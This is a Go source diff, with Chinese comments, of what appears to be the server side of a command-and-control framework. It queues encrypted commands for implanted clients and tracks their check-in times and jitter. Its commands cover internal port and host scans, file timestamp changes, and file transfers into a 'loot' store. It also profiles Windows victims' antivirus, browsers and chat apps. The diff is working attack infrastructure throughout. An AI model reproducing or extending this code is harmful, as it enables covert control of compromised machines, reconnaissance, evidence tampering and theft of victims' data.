+	q.messages = append(q.messages[:sID], q.messages[sID+1:]...)
+
+	// 如果 sID 在 pos 之前，删除后 pos 需要 -1
+	if sID < posI {
+		posI--
+	}
+
+	// 插入到 pos 前面
+	q.messages = append(q.messages, Msg_get{})
+	copy(q.messages[posI+1:], q.messages[posI:])
+	q.messages[posI] = item
+
+	return true, ""
+}
+
+// 将 msg_map 输出给前端
+func GetMsgList(uid string) []string {
+	if uid == "" {
+		return []string{}
+	}
+
+	queuesMu.RLock()
+	q := msgQueues[uid]
+	queuesMu.RUnlock()
+
+	if q == nil {
+		return []string{}
+	}
+
+	q.mu.Lock()
+	defer q.mu.Unlock()
+
+	result := make([]string, 0, len(q.messages))
+
+	for i := range q.messages {
+		message, ok := formatMessageForUI(q.messages[i])
+		if !ok {
+			continue
+		}
+		result = append(result, message)
+	}
+
+	return result
+}
+
+func updateGetMsgList(uid string) []string {
+	if uid == "" {
+		return []string{}
+	}
+
+	queuesMu.RLock()
+	q := msgQueues[uid]
+	queuesMu.RUnlock()
+
+	if q == nil {
+		return []string{}
+	}
+
+	q.mu.Lock()
+	defer q.mu.Unlock()
+
+	if len(q.messages) == 0 {
+		return []string{}
+	}
+	message, ok := formatMessageForUI(
+		q.messages[len(q.messages)-1],
+	)
+	if !ok {
+		return []string{}
+	}
+	return []string{message}
+}
+
+// 获取结果
+func Getresults(uid, taskid string) string {
+	// 1. 先用读锁看这个 UID 的队列是否存在
+	resultMu.RLock()
+	queue, exists := msgResultQueues[uid]
+	resultMu.RUnlock()
+	if !exists {
+		return ""
+	}
+	queue.mu.Lock()
+	defer queue.mu.Unlock()
+	for i := range queue.results {
+		res := &queue.results[i]
+		if res.Taskid == taskid {
+			result := res.Result
+			queue.results = append(queue.results[:i], queue.results[i+1:]...)
+			return result
+		}
+	}
+	return ""
+}
+
+// 写入结果
+func Results(uid, results, Taskid string, code_map map[byte]int) {
+	keyMu.RLock()
+	key, exists := key_map[uid]
+	keyMu.RUnlock()
+	if !exists {
+		return
+	}
+	decry_results := Get_decry_s(&results, &key, code_map)
+	decry_task := Get_decry_s(&Taskid, &key, code_map)
+	go SaveMsg(uid, decry_results, decry_task)
+
+	// 写入结果列表
+	resultMu.RLock()
+	queue, ok := msgResultQueues[uid]
+	resultMu.RUnlock()
+
+	if !ok {
+		// 如果队列不存在，加写锁创建一个
+		resultMu.Lock()
+		// 双重检查，防止并发创建
+		if queue, ok = msgResultQueues[uid]; !ok {
+			queue = &resultQueue{results: make([]Msg_result, 0)}
+			msgResultQueues[uid] = queue
+		}
+		resultMu.Unlock()
+	}
+
+	// 写入具体 UID 的结果池，只锁 queue.mu
+	queue.mu.Lock()
+	queue.results = append(queue.results, Msg_result{
+		Uid:    uid,
+		Result: decry_results,
+		Taskid: decry_task,
+	})
+	queue.mu.Unlock()
+
+	// 日志记录
+	var shellname string
+	clientDataMu.RLock()
+	for i := range client_data.Clients {
+		client := &client_data.Clients[i]
+		if uid == client.Uid {
+			shellname = client.Host
+			break
+		}
+	}
+	clientDataMu.RUnlock()
+	windows_clientMu.RLock()
+	for i := range windows_client_data.Clients {
+		client := &windows_client_data.Clients[i]
+		if uid == client.Uid {
+			shellname = client.Host
+			break
+		}
+	}
+	windows_clientMu.RUnlock()
+
+	go PushAgentData(uid, "updateGetMsgPost")
+
+	log_str := fmt.Sprintf(log_word["result"], shellname, uid, len(results))
+	logger.WriteLog(log_str)
+}
+
+// 获取指令
+func GetMsg(uid, uidBytes string) string {
+	current := time.Now()
+	formattedTime := current.Format("2006.01.02 15:04:05")
+	go func(uid string) {
+		clientDataMu.Lock()
+		for i := range client_data.Clients {
+			client := &client_data.Clients[i]
+			if client.Uid == uid {
+				client.checkTime = formattedTime
+				break
+			}
+		}
+		clientDataMu.Unlock()
+		windows_clientMu.Lock()
+		for i := range windows_client_data.Clients {
+			client := &windows_client_data.Clients[i]
+			if client.Uid == uid {
+				client.CheckTime = formattedTime
+				break
+			}
+		}
+		windows_clientMu.Unlock()
+
+		go PushWS(
+			"",
+			"check_time",
+			map[string]interface{}{
+				"uid":        uid,
+				"check_time": formattedTime,
+			},
+		)
+
+	}(uid)
+	keyMu.RLock()
+	_, hasKey := key_map[uid]
+	keyMu.RUnlock()
+	if !hasKey {
+		return uidBytes
+	}
+	// 先取队列指针（只读锁）
+	queuesMu.RLock()
+	queue := msgQueues[uid]
+	queuesMu.RUnlock()
+	if queue == nil {
+		return ""
+	}
+	// 只锁队列内容
+	queue.mu.Lock()
+	defer queue.mu.Unlock()
+	if len(queue.messages) == 0 {
+		return ""
+	}
+	msg := queue.messages[0]
+	queue.messages = queue.messages[1:]
+
+	go PushWS(
+		"",
+		"send_delMsgGet",
+		map[string]interface{}{
+			"uid":    uid,
+			"taskid": msg.Taskid,
+			"index":  "0",
+		},
+	)
+
+	return msg.Encry_Msg
+}
+
+// 写入指令（推送到对应 uid 的消息队列）
+type CommandMessage struct {
+	Command string   `json:"command"`
+	Args    []string `json:"args,omitempty"`
+	TaskID  string   `json:"task_id,omitempty"`
+}
+
+func formatMessageForUI(item Msg_get) (string, bool) {
+	var message CommandMessage
+
+	if err := json.Unmarshal([]byte(item.Ori_Msg), &message); err != nil {
+		return "", false
+	}
+	if item.Taskid != "" {
+		message.TaskID = item.Taskid
+	}
+	data, err := json.Marshal(message)
+	if err != nil {
+		return "", false
+	}
+	return string(data), true
+}
+
+func decodeCommand(raw string) (CommandMessage, error) {
+	var message CommandMessage
+
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return CommandMessage{}, errors.New("empty command")
+	}
+
+	if err := json.Unmarshal([]byte(raw), &message); err != nil {
+		return CommandMessage{}, errors.New("invalid command format")
+	}
+
+	message.Command = strings.TrimSpace(message.Command)
+	if message.Command == "" {
+		return CommandMessage{}, errors.New("missing command")
+	}
+
+	if message.Args == nil {
+		message.Args = []string{}
+	}
+
+	return message, nil
+}
+
+func encodeCommand(message CommandMessage) (string, error) {
+	data, err := json.Marshal(message)
+	if err != nil {
+		return "", err
+	}
+	return string(data), nil
+}
+
+func makeCommand(command string, args ...string) string {
+	data, err := encodeCommand(CommandMessage{
+		Command: command,
+		Args:    args,
+	})
+	if err != nil {
+		return ""
+	}
+	return data
+}
+
+func normalizeSplitSize(value string) string {
+	value = strings.TrimSpace(value)
+
+	if dot := strings.IndexByte(value, '.'); dot >= 0 {
+		value = value[:dot]
+	}
+
+	size, err := strconv.Atoi(value)
+	if err != nil || size <= 0 {
+		return "1048576"
+	}
+
+	return strconv.Itoa(size)
+}
+
+// 写入指令（推送到对应 uid 的消息队列）
+func Getcmd(uid, cmd, Taskid, port string) string {
+	if uid == "" || port == "" || cmd == "" {
+		return "missing parameter"
+	}
+
+	serverRouteMu.RLock()
+	baseRounds, exists := base_map[port]
+	serverRouteMu.RUnlock()
+
+	if !exists {
+		return "port not registered"
+	}
+
+	keyMu.RLock()
+	key, exists := key_map[uid]
+	keyMu.RUnlock()
+
+	if !exists {
+		return "client not registered"
+	}
+
+	request, err := decodeCommand(cmd)
+	if err != nil {
+		return err.Error()
+	}
+
+	command := request.Command
+	args := append([]string(nil), request.Args...)
+
+	var logMsg string
+	includeTaskID := false
+
+	switch command {
+	case "CHANG_FILE_NAME", "CHANG_FILE_TIME":
+		if len(args) != 2 || args[0] == "" || args[1] == "" {
+			return "missing parameter"
+		}
+
+		if command == "CHANG_FILE_NAME" {
+			logMsg = fmt.Sprintf(
+				log_word["change_file_name"],
+				uid,
+				args[0],
+				args[1],
+			)
+		} else {
+			logMsg = fmt.Sprintf(
+				log_word["change_file_time"],
+				uid,
+				args[0],
+				args[1],
+			)
+		}
+
+	case "SWITCH_VERSION":
+		if len(args) != 1 || args[0] == "" {
+			return "missing parameter"
+		}
+
+		version := args[0]
+
+		go func() {
+			clientDataMu.Lock()
+			for i := range client_data.Clients {
+				client := &client_data.Clients[i]
+				if client.Uid == uid {
+					client.version = version
+					break
+				}
+			}
+			clientDataMu.Unlock()
+
+			windows_clientMu.Lock()
+			for i := range windows_client_data.Clients {
+				client := &windows_client_data.Clients[i]
+				if client.Uid == uid {
+					client.Version = version
+					break
+				}
+			}
+			windows_clientMu.Unlock()
+		}()
+
+	case "LOOK_UP_FILE":
+		if len(args) != 1 || args[0] == "" {
+			return "missing parameter"
+		}
+	
+		includeTaskID = true
+	case "GET_DELAY", "GET_JITTER":
+		if len(args) != 1 {
+			return "missing parameter"
+		}
+
+		value, err := strconv.Atoi(strings.TrimSpace(args[0]))
+		if err != nil {
+			return "parameter is not int"
+		}
+		if value <= 0 {
+			return "parameter must be > 0"
+		}
+
+		args[0] = strconv.Itoa(value)
+
+	case "GET_PORTS", "GET_U_FRIENDS":
+		if len(args) != 3 {
+			return "missing parameter"
+		}
+
+		sleepTime, err := strconv.Atoi(strings.TrimSpace(args[2]))
+		if err != nil {
+			return "delay is not int"
+		}
+
+		if sleepTime < 1 {
+			sleepTime = 1
+		}
+
+		if command == "GET_U_FRIENDS" {
+			ipParts := strings.Split(args[0], ".")
+			if len(ipParts) != 4 || !Check_comment(ipParts[3], "ping") {
+				return "Format error"
+			}
+		}
+
+		if !Check_comment(args[1], "port") {
+			return "Format error"
+		}
+
+		args[2] = strconv.Itoa(sleepTime)
+
+		logMsg = fmt.Sprintf(
+			log_word["scan_msg"],
+			uid,
+			args[0],
+		)
+
+	case "GET_U_FILE":
+		if len(args) != 2 || args[0] == "" {
+			return "missing parameter"
+		}
+		args[1] = normalizeSplitSize(args[1])
+
+	case "LOAD_U_FILE":
+		if len(args) != 3 {
+			return "missing parameter"
+		}
+		args[len(args)-1] = normalizeSplitSize(args[len(args)-1])
+
+	default:
+		includeTaskID = true
+	}
+
+	commandTaskID := ""
+
+	if includeTaskID {
+		commandTaskID = Taskid
+	}
+
+	finalCmd, err := encodeCommand(CommandMessage{
+		Command: command,
+		Args:    args,
+		TaskID:  commandTaskID,
+	})
+	if err != nil {
+		return "failed to encode command"
+	}
+
+	encryptedCmd := Get_encry_s(
+		&finalCmd,
+		&key,
+		&baseRounds,
+	)
+
+	newMsg := Msg_get{
+		Ori_Msg:   cmd,
+		Encry_Msg: encryptedCmd,
+		Taskid:    Taskid,
+	}
+
+	queue := getOrCreateQueue(uid)
+
+	queue.mu.Lock()
+	queue.messages = append(queue.messages, newMsg)
+	queue.mu.Unlock()
+
+	if logMsg != "" {
+		logger.WriteLog(logMsg)
+	} else {
+		skipLog := command == "CHANG_FILE_NAME" ||
+			command == "CHANG_FILE_TIME" ||
+			command == "GET_DELAY" ||
+			command == "LOOK_UP_FILE" ||
+			command == "LOAD_U_FILE" ||
+			command == "SWITCH_VERSION" ||
+			command == "GET_U_FILE" ||
+			command == "GET_JITTER"
+
+		if !skipLog {
+			logCmd := command
+			if len(args) > 0 {
+				logCmd += " " + strings.Join(args, " ")
+			}
+
+			go func(uid, logCmd string) {
+				clientDataMu.RLock()
+				for i := range client_data.Clients {
+					client := &client_data.Clients[i]
+					if client.Uid == uid {
+						logStr := fmt.Sprintf(
+							log_word["msg"],
+							client.Host,
+							uid,
+							logCmd,
+						)
+						clientDataMu.RUnlock()
+						logger.WriteLog(logStr)
+						return
+					}
+				}
+				clientDataMu.RUnlock()
+
+				windows_clientMu.RLock()
+				for i := range windows_client_data.Clients {
+					client := &windows_client_data.Clients[i]
+					if client.Uid == uid {
+						logStr := fmt.Sprintf(
+							log_word["msg"],
+							client.Host,
+							uid,
+							logCmd,
+						)
+						windows_clientMu.RUnlock()
+						logger.WriteLog(logStr)
+						return
+					}
+				}
+				windows_clientMu.RUnlock()
+			}(uid, logCmd)
+		}
+	}
+
+	go PushAgentData(uid, "updateGetMsgList")
+
+	return ""
+}
+// 写入内网资产
+func Net_results(uid, results string, code_rounds map[byte]int) {
+	keyMu.RLock()
+	key, exists := key_map[uid]
+	keyMu.RUnlock()
+	if exists {
+		encryptedData := Get_decry_s(&results, &key, code_rounds)
+		in_port(uid, encryptedData)
+		go func(encryptedData, uid string) {
+			var shellname string
+			clientDataMu.RLock()
+			for i := range client_data.Clients {
+				client := &client_data.Clients[i]
+				if uid == client.Uid {
+					shellname = client.Host
+					break
+				}
+			}
+			clientDataMu.RUnlock()
+
+			windows_clientMu.RLock()
+			for i := range windows_client_data.Clients {
+				client := &windows_client_data.Clients[i]
+				if uid == client.Uid {
+					shellname = client.Host
+					break
+				}
+			}
+			windows_clientMu.RUnlock()
+			
+			logStr := fmt.Sprintf(log_word["scan_result"], shellname, uid, len(encryptedData))
+			logger.WriteLog(logStr)
+		}(encryptedData, uid)
+	}
+}
+func Check_comment(check_parts, option string) bool {
+	if strings.Contains(check_parts, "-") {
+		split_int := strings.Split(check_parts, "-")
+		s, se := strconv.Atoi(split_int[0])
+		e, ee := strconv.Atoi(split_int[1])
+		if se != nil || ee != nil || s < 0 || e < 0 {
+			return false
+		}
+		if s > e {
+			return false
+		}
+		if option == "port" && e > 65535 {
+			return false
+		} else if option == "ping" && e > 255 {
+			return false
+		}
+	} else if strings.Contains(check_parts, ",") {
+		portMap := make(map[int]bool)
+		split_int := strings.Split(check_parts, ",")
+		for _, v := range split_int {
+			port, err := strconv.Atoi(strings.TrimSpace(v))
+			if err != nil || port < 0 {
+				return false
+			}
+			if option == "port" && port > 65535 {
+				return false
+			} else if option == "ping" && port > 255 {
+				return false
+			}
+			if !portMap[port] {
+				portMap[port] = true
+			}
+		}
+	} else {
+		_, err := strconv.Atoi(check_parts)
+		return err == nil
+	}
+	return true
+}
+
+// 写入内网资产端口
+func in_port(uid, data string) {
+	ipPorts := make(map[string][]string)
+	re := regexp.MustCompile(`(.+?):\[(\d+)\]`)
+	matches := re.FindAllStringSubmatch(data, -1)
+	for _, match := range matches {
+		if len(match) < 3 {
+			continue
+		}
+		host := match[1]
+		port := match[2]
+		if strings.HasPrefix(host, "[") && strings.HasSuffix(host, "]") {
+			host = host[1 : len(host)-1]
+		}
+		ipPorts[host] = append(ipPorts[host], port)
+	}
+	for host, ports := range ipPorts {
+		put_innet(uid, host, ports)
+	}
+}
+
+// 删除内网
+func Del_shell_innet(target, uid string) bool {
+	dataInnetmu.Lock()
+	defer dataInnetmu.Unlock()
+	for i := range data_innet.Innets {
+		innet := &data_innet.Innets[i]
+		if target == innet.Target && uid == innet.Uid {
+			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
+			return true
+		}
+	}
+	return false
+}
+
+func chatUID() string {
+	b := make([]byte, 16)
+	if _, err := crand.Read(b); err != nil {
+		return fmt.Sprintf("%d", time.Now().UnixNano())
+	}
+	b[6] = (b[6] & 0x0f) | 0x40
+	b[8] = (b[8] & 0x3f) | 0x80
+	return fmt.Sprintf("%x-%x-%x-%x-%x",
+		b[0:4],
+		b[4:6],
+		b[6:8],
+		b[8:10],
+		b[10:],
+	)
+}
+
+func LoadHistoryFiles() error {
+	uploadDir := "./chat_uploads/"
+	// 检查目录是否存在
+	if _, err := os.Stat(uploadDir); os.IsNotExist(err) {
+		// 如果目录不存在，则创建
+		err := os.MkdirAll(uploadDir, os.ModePerm)
+		if err != nil {
+			return fmt.Errorf("failed to create directory %s: %v", uploadDir, err)
+		}
+	}
+	files, err := os.ReadDir(uploadDir)
+	if err != nil {
+		return err
+	}
+	dataChatmu.Lock()
+	defer dataChatmu.Unlock()
+	maxChatID := chatUID()
+	for _, f := range files {
+		if f.IsDir() {
+			continue
+		}
+		filename := f.Name()
+		exists := false
+		for i := range data_chat.Chats {
+			c := &data_chat.Chats[i]
+			if c.Message == filename && c.Type == "file" {
+				exists = true
+				break
+			}
+		}
+		if exists {
+			continue
+		}
+		fileInfo, err := os.Stat(
+			uploadDir + filename,
+		)
+		if err != nil {
+			continue
+		}
+		data_chat.Chats = append(
+			data_chat.Chats,
+			Chat{
+				Username: "history file",
+				Message:  filename,
+				Time:     fileInfo.ModTime().Format("2006-01-02 15:04:05"),
+				Chatid:   maxChatID,
+				Type:     "file",
+			},
+		)
+	}
+	return nil
+}
+
+func GetChatSlice() []Chat {
+	dataChatmu.RLock()
+	defer dataChatmu.RUnlock()
+	chats := make([]Chat, len(data_chat.Chats))
+	copy(
+		chats,
+		data_chat.Chats,
+	)
+	return chats
+}
+
+func updateChatSlice(chatid string) []Chat {
+	dataChatmu.RLock()
+	defer dataChatmu.RUnlock()
+	for i := range data_chat.Chats {
+		chat := &data_chat.Chats[i]
+		if chat.Chatid == chatid {
+			return []Chat{*chat}
+		}
+	}
+	return nil
+}
+
+func GetAllPluginCode() []Plugin {
+	serverPluginMu.RLock()
+	defer serverPluginMu.RUnlock()
+	codeSlice := make([]Plugin, 0, len(server_plugin.Plugins))
+	for i := range server_plugin.Plugins {
+		plugin := &server_plugin.Plugins[i]
+		codeSlice = append(
+			codeSlice,
+			*plugin,
+		)
+	}
+	return codeSlice
+}
+
+func updatePluginCode(codeWord string) []Plugin {
+	serverPluginMu.RLock()
+	defer serverPluginMu.RUnlock()
+	matched := make([]Plugin, 0)
+	for i := range server_plugin.Plugins {
+		plugin := &server_plugin.Plugins[i]
+		if plugin.CodeWord == codeWord {
+			matched = append(matched, *plugin)
+		}
+	}
+	if len(matched) == 0 {
+		return nil
+	}
+	return matched
+}
+
+func ServerIndex() []Server {
+	serverDataMu.RLock()
+	defer serverDataMu.RUnlock()
+	matchedServers := make([]Server, 0, len(server_data.Servers))
+	for i := range server_data.Servers {
+		server := &server_data.Servers[i]
+		matchedServers = append(matchedServers, *server)
+	}
+	return matchedServers
+}
+func updateServerIndex(port string) []Server {
+	serverDataMu.RLock()
+	defer serverDataMu.RUnlock()
+	for i := range server_data.Servers {
+		server := &server_data.Servers[i]
+		if server.Port == port {
+			return []Server{*server}
+		}
+	}
+	return nil
+}
+
+func cleanupServerState(port string) {
+	serverDataMu.Lock()
+	for i := len(server_data.Servers) - 1; i >= 0; i-- {
+		server := &server_data.Servers[i]
+		if server.Port == port {
+			server_data.Servers = append(
+				server_data.Servers[:i],
+				server_data.Servers[i+1:]...,
+			)
+		}
+	}
+	serverDataMu.Unlock()
+
+	serverRouteMu.Lock()
+	delete(base_map, port)
+	delete(code_map, port)
+	serverRouteMu.Unlock()
+}
+
+type EnrichedClient struct {
+	Username        string                         `json:"username"`
+	Host            string                         `json:"host"`
+	OS              string                         `json:"os"`
+	Delay           int                            `json:"delay"`
+	OnlineTime      string                         `json:"online_time"`
+	ExternalIP      string                         `json:"external_ip"`
+	LocalIP         string                         `json:"local_ip"`
+	CurrentDir      string                         `json:"current_dir"`
+	Version         string                         `json:"version"`
+	Remarks         string                         `json:"remarks"`
+	CheckTime       string                         `json:"check_time"`
+	Uid             string                         `json:"uid"`
+	Server          string                         `json:"server"`
+	PluginParameter map[string]map[string][]string `json:"plugin_parameter"`
+	Executable      string                         `json:"executable"`
+	Jitter          int                            `json:"jitter"`
+	Protocol        string                         `json:"protocol"`
+}
+
+func buildPluginParamMap(serverRemark, targetOS string) map[string]map[string][]string {
+	pluginParamMap := make(map[string]map[string][]string)
+	normalizedServerRemark := strings.TrimSpace(serverRemark)
+	normalizedOS := strings.ToLower(strings.TrimSpace(targetOS))
+	for j := range server_plugin.Plugins {
+		plugin := &server_plugin.Plugins[j]
+		if strings.TrimSpace(plugin.Remark) != normalizedServerRemark {
+			continue
+		}
+		pluginOS := strings.ToLower(strings.TrimSpace(plugin.OS))
+		if pluginOS == "" {
+			continue
+		}
+		if pluginOS != normalizedOS {
+			continue
+		}
+		if pluginParamMap[pluginOS] == nil {
+			pluginParamMap[pluginOS] = make(map[string][]string)
+		}
+		pluginParamMap[pluginOS][plugin.CodeWord] = plugin.ParameterDesc
+	}
+	return pluginParamMap
+}
+
+func UserIndex() []EnrichedClient {
+	clientDataMu.RLock()
+	defer clientDataMu.RUnlock()
+	matchedClients := make([]EnrichedClient, 0, len(client_data.Clients))
+	serverPluginMu.RLock()
+	defer serverPluginMu.RUnlock()
+	for i := range client_data.Clients {
+		client := &client_data.Clients[i]
+		pluginParamMap := buildPluginParamMap(client.Server, client.OS)
+		enriched := EnrichedClient{
+			Username:        client.Username,
+			Host:            client.Host,
+			OS:              client.OS,
+			Delay:           client.Delay,
+			OnlineTime:      client.OnlineTime,
+			ExternalIP:      client.ExternalIP,
+			LocalIP:         client.LocalIP,
+			CurrentDir:      client.CurrentDir,
+			Version:         client.version,
+			Remarks:         client.Remarks,
+			CheckTime:       client.checkTime,
+			Uid:             client.Uid,
+			Server:          client.Server,
+			PluginParameter: pluginParamMap,
+			Executable:      client.Executable,
+			Jitter:          client.Jitter,
+			Protocol:        client.Proto,
+		}
+		matchedClients = append(matchedClients, enriched)
+	}
+	return matchedClients
+}
+
+func updateIndex(uid string) *EnrichedClient {
+	clientDataMu.RLock()
+	var clientCopy Client
+	found := false
+	for i := range client_data.Clients {
+		client := &client_data.Clients[i]
+		if uid == client.Uid {
+			clientCopy = *client
+			found = true
+			break
+		}
+	}
+	clientDataMu.RUnlock()
+
+	if !found {
+		return nil
+	}
+
+	serverPluginMu.RLock()
+	pluginParamMap := buildPluginParamMap(clientCopy.Server, clientCopy.OS)
+	serverPluginMu.RUnlock()
+
+	enriched := EnrichedClient{
+		Username:        clientCopy.Username,
+		Host:            clientCopy.Host,
+		OS:              clientCopy.OS,
+		Delay:           clientCopy.Delay,
+		OnlineTime:      clientCopy.OnlineTime,
+		ExternalIP:      clientCopy.ExternalIP,
+		LocalIP:         clientCopy.LocalIP,
+		CurrentDir:      clientCopy.CurrentDir,
+		Version:         clientCopy.version,
+		Remarks:         clientCopy.Remarks,
+		CheckTime:       clientCopy.checkTime,
+		Uid:             clientCopy.Uid,
+		Server:          clientCopy.Server,
+		PluginParameter: pluginParamMap,
+		Executable:      clientCopy.Executable,
+		Jitter:          clientCopy.Jitter,
+		Protocol:        clientCopy.Proto,
+	}
+	return &enriched
+}
+
+// Windows 专用的客户端列表获取函数
+type EnrichedWindowsClient struct {
+	Username        string                         `json:"username"`
+	Host            string                         `json:"host"`
+	OS              string                         `json:"os"`
+	Delay           int                            `json:"delay"`
+	OnlineTime      string                         `json:"online_time"`
+	ExternalIP      string                         `json:"external_ip"`
+	LocalIP         string                         `json:"local_ip"`
+	CurrentDir      string                         `json:"current_dir"`
+	Version         string                         `json:"version"`
+	Remarks         string                         `json:"remarks"`
+	CheckTime       string                         `json:"check_time"`
+	Uid             string                         `json:"uid"`
+	Server          string                         `json:"server"`
+	PluginParameter map[string]map[string][]string `json:"plugin_parameter"`
+	Executable      string                         `json:"executable"`
+	Jitter          int                            `json:"jitter"`
+	Protocol        string                         `json:"protocol"`
+	// Windows 专属字段
+	MacAddresses string `json:"mac_addresses"` // MAC地址
+	CPUInfo      string `json:"cpu_info"`      // CPU信息
+	Antivirus    string `json:"antivirus"`     // 杀毒软件
+	Browsers     string `json:"browsers"`      // 浏览器信息
+	ChatApps     string `json:"chat_apps"`     // 聊天应用
+	MemoryInfo   string `json:"memory_info"`   // 内存使用情况
+	SystemType   string `json:"system_type"`   // 系统类型
+	Architecture string `json:"architecture"`  // 架构信息
+}
+
+func windows_pro_UserIndex() []EnrichedWindowsClient {
+	windows_clientMu.RLock()
+	defer windows_clientMu.RUnlock()
+	matchedClients := make([]EnrichedWindowsClient, 0, len(windows_client_data.Clients))
+	serverPluginMu.RLock()
+	defer serverPluginMu.RUnlock()
+	for i := range windows_client_data.Clients {
+		client := &windows_client_data.Clients[i]
+		pluginParamMap := buildPluginParamMap(client.Server, client.OS)
+		enriched := EnrichedWindowsClient{
+			Username:        client.Username,
+			Host:            client.Host,
+			OS:              client.OS,
+			Delay:           client.Delay,
+			OnlineTime:      client.OnlineTime,
+			ExternalIP:      client.ExternalIP,
+			LocalIP:         client.LocalIP,
+			CurrentDir:      client.CurrentDir,
+			Version:         client.Version,
+			Remarks:         client.Remarks,
+			CheckTime:       client.CheckTime,
+			Uid:             client.Uid,
+			Server:          client.Server,
+			PluginParameter: pluginParamMap,
+			Executable:      client.Executable,
+			Jitter:          client.Jitter,
+			Protocol:        client.Proto,
+			// Windows 专属字段（指针访问）
+			MacAddresses: client.MacAddresses,
+			CPUInfo:      client.CPUInfo,
+			Antivirus:    client.Antivirus,
+			Browsers:     client.Browsers,
+			ChatApps:     client.ChatApps,
+			MemoryInfo:   client.MemoryInfo,
+			SystemType:   client.SystemType,
+			Architecture: client.Architecture,
+		}
+		matchedClients = append(matchedClients, enriched)
+	}
+
+	return matchedClients
+}
+
+func updateIndex_windows(uid string) *EnrichedWindowsClient {
+	windows_clientMu.RLock()
+	var clientCopy WindowsClient
+	found := false
+	for i := range windows_client_data.Clients {
+		client := &windows_client_data.Clients[i]
+		if uid == client.Uid {
+			clientCopy = *client
+			found = true
+			break
+		}
+	}
+	windows_clientMu.RUnlock()
+
+	if !found {
+		return nil
+	}
+
+	serverPluginMu.RLock()
+	pluginParamMap := buildPluginParamMap(clientCopy.Server, clientCopy.OS)
+	serverPluginMu.RUnlock()
+
+	enriched := EnrichedWindowsClient{
+		Username:        clientCopy.Username,
+		Host:            clientCopy.Host,
+		OS:              clientCopy.OS,
+		Delay:           clientCopy.Delay,
+		OnlineTime:      clientCopy.OnlineTime,
+		ExternalIP:      clientCopy.ExternalIP,
+		LocalIP:         clientCopy.LocalIP,
+		CurrentDir:      clientCopy.CurrentDir,
+		Version:         clientCopy.Version,
+		Remarks:         clientCopy.Remarks,
+		CheckTime:       clientCopy.CheckTime,
+		Uid:             clientCopy.Uid,
+		Server:          clientCopy.Server,
+		PluginParameter: pluginParamMap,
+		Executable:      clientCopy.Executable,
+		Jitter:          clientCopy.Jitter,
+		Protocol:        clientCopy.Proto,
+		MacAddresses:    clientCopy.MacAddresses,
+		CPUInfo:         clientCopy.CPUInfo,
+		Antivirus:       clientCopy.Antivirus,
+		Browsers:        clientCopy.Browsers,
+		ChatApps:        clientCopy.ChatApps,
+		MemoryInfo:      clientCopy.MemoryInfo,
+		SystemType:      clientCopy.SystemType,
+		Architecture:    clientCopy.Architecture,
+	}
+	return &enriched
+}
+
+// 下载文件
+func DownloadFile(uid, keyDecry string, code_map map[byte]int) ([]byte, error) {
+	keyMu.RLock()
+	key, exists := key_map[uid]
+	keyMu.RUnlock()
+	if !exists {
+		return nil, errors.New("key not found")
+	}
+	DoByteMu.Lock()
+	defer DoByteMu.Unlock()
+	filekey := Get_decry_s(&keyDecry, &key, code_map)
+
+	existingData, exists := DownloadFile_byte_parts[filekey]
+	if !exists {
+		return nil, errors.New("file not found")
+	}
+	var fileInfo uploadFileKey
+
+	if err := json.Unmarshal([]byte(filekey), &fileInfo); err != nil {
+		return nil, errors.New("invalid file key")
+	}
+
+	if fileInfo.UID != uid {
+		return nil, errors.New("file key does not belong to client")
+	}
+
+	if fileInfo.Filename == "" || fileInfo.SplitSize <= 0 {
+		return nil, errors.New("invalid file key fields")
+	}
+
+	splitSize := fileInfo.SplitSize
+	currentPartsCount, exists := parts_count[filekey]
+	if !exists {
+		currentPartsCount = 0
+	}
+	totalParts := int(math.Ceil(float64(len(existingData)) / float64(splitSize)))
+	if currentPartsCount >= totalParts {
+		log_str := fmt.Sprintf(log_word["download"], uid, fileInfo.Filename)
+		logger.WriteLog(log_str)
+		delete(DownloadFile_byte_parts, filekey)
+		delete(parts_count, filekey)
+		return nil, nil
+	}
+	start := currentPartsCount * splitSize
+	end := start + splitSize
+	if end > len(existingData) {
+		end = len(existingData)
+	}
+	decrydate := existingData[start:end]
+
+	partData := Encrypt(decrydate, []byte(key))
+	if partData == nil {
+		return nil, errors.New("encry fail")
+	}
+	parts_count[filekey] = currentPartsCount + 1
+	log_str := fmt.Sprintf(log_word["download_part"], uid, fileInfo.Filename, len(partData), currentPartsCount)
+	logger.WriteLog(log_str)
+	if parts_count[filekey] >= totalParts {
+		delete(DownloadFile_byte_parts, filekey)
+		delete(parts_count, filekey)
+	}
+	return partData, nil
+}
+
+// 上传文件处理
+func UploadFileHandler(uid, data, filename string,
+	fileData []byte, code_map map[byte]int) {
+	uid = strings.TrimSpace(uid)
+	if !isSafeLootPathPart(uid) {
+		return
+	}
+	keyMu.RLock()
+	key, exists := key_map[uid]
+	keyMu.RUnlock()
+	if !exists {
+		return
+	}
+	key_part := []byte(key)
+	decry_data := Get_decry_s(&data, &key, code_map)
+	tempFilename := strings.TrimSpace(Get_decry_s(&filename, &key, code_map))
+	realFilename := strings.TrimSpace(getFilenameFromPath(tempFilename))
+	if !isSafeLootPathPart(realFilename) {
+		return
+	}
+	var dataList []string
+	if err := json.Unmarshal([]byte(decry_data), &dataList); err != nil {
+		return
+	}
+	if len(dataList) < 5 {
+		return
+	}
+	username := dataList[0]
+	splitSize := dataList[1]
+	fileSize := dataList[2]
+	start := dataList[3]
+	end := dataList[4]
+	fileLog := log_word["request_file"]
+	logger.WriteLog(fileLog)
+	splitPos, _ := strconv.Atoi(splitSize)
+	filePos, _ := strconv.Atoi(fileSize)
+	startPos, _ := strconv.Atoi(start)
+	endPos, _ := strconv.Atoi(end)
+	fileLog1 := fmt.Sprintf(log_word["request_file_part"], realFilename, len(fileData))
+	logger.WriteLog(fileLog1)
+
+	receivedFilePath := "./uploads/" + uid + "/" + realFilename
+	dirPath := filepath.Dir(receivedFilePath)
+	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
+		if err := os.MkdirAll(dirPath, 0755); err != nil {
+			return
+		}
+	}
+	// 解密当前分块
+	decrypted := Decrypt(fileData, key_part)
+	if decrypted == nil {
+		return
+	}
+	// 直接追加写入目标文件
+	f, err := os.OpenFile(receivedFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return
+	}
+	_, err = f.Write(decrypted)
+	f.Close()
+	if err != nil {
+		return
+	}
+
+	fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
